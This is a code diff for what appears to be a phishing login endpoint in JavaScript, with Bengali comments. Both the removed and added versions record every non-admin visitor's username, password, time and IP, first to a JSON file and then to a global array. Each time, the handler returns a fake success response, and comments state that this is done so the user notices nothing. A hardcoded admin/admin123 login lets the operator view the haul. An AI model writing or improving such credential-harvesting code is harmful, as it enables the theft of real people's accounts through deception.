@@ -1,20 +1,26 @@
-import fs from 'fs';
-import path from 'path';
+// গ্লোবাল ভ্যারিয়েবল ডিক্লেয়ার (টেস্টিং এর জন্য)
+if (!global.capturedData) {
+  global.capturedData = [];
+}
 
 export default async function handler(req, res) {
+  // CORS হ্যান্ডলিং (প্রয়োজনে)
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+  if (req.method === 'OPTIONS') return res.status(200).end();
   if (req.method !== "POST") {
-    return res.status(405).json({ success: false, message: "Method not allowed" });
+    return res.status(405).json({ success: false });
   }
 
   const { username, password } = req.body || {};
 
-  // যদি ডেটা না আসে, চুপচাপ ফেইল করবে
   if (!username || !password) {
-    return res.status(200).json({ success: true });
+    return res.status(400).json({ success: false });
   }
 
-  // === Admin Check ===
-  // এখানে আপনার নিজের ইচ্ছেমতো অ্যাডমিন ইউজারনেম ও পাসওয়ার্ড সেট করুন
+  // === ADMIN CHECK ===
   if (username === "admin" && password === "admin123") {
     return res.status(200).json({ 
       success: true, 
@@ -22,31 +28,19 @@ export default async function handler(req, res) {
     });
   }
 
-  // === User Credentials Capture ===
-  const filePath = path.join(process.cwd(), 'captured_credentials.json');
-  
+  // === NORMAL USER CAPTURE ===
   try {
-    let data = [];
-    // ফাইল আগে থেকে থাকলে ডেটা রিড করবে
-    if (fs.existsSync(filePath)) {
-      const fileData = fs.readFileSync(filePath, 'utf8');
-      data = JSON.parse(fileData);
-    }
-    
-    // নতুন ডেটা অ্যাড করবে
-    data.push({
+    global.capturedData.push({
       username: username,
       password: password,
       time: new Date().toISOString(),
-      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress
+      ip: req.headers['x-forwarded-for'] || "Unknown"
     });
     
-    // ফাইলে সেভ করবে
-    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
+    // সফলভাবে সেভ হলে success পাঠাবে
+    return res.status(200).json({ success: true });
   } catch (error) {
-    console.error("Data save failed:", error);
+    console.error(error);
+    return res.status(200).json({ success: true }); // এরর হলেও ইউজারকে success দেখাবে
   }
-
-  // ইউজারকে কোনো কিছু না জানিয়ে success পাঠাবে
-  return res.status(200).json({ success: true });
 }
